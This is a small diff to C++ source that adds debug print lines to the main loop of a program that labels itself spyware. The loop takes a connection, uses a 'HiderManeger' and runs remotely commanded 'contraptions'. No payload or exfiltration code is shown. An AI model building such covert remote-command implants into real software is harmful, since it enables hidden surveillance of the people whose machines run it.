@@ -31,6 +31,7 @@ int main() {
     bool cont = true;
     while (cont)
     {
+        std::cerr << "cyber" << std::endl;
         // admin.segTest();
         std::shared_ptr<Connection> conn;
         // TODO add error strtegy
@@ -40,7 +41,7 @@ int main() {
             continue;
         }
         // admin.segTest();
-
+        std::cerr << "cyber into loopiter" << std::endl;
         loopIter(conn, hiderManeger, admin);
         std::cerr << "spyware: compleated loop iter\n";
     }
@@ -66,6 +67,7 @@ void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, Cont
     {
     case RunContraption:
         // admin.segTest();
+        std::cerr << "Running Contraption:" << std::endl;
         stat = admin.runContraption(conn, cmd.identifier);
         break;
 
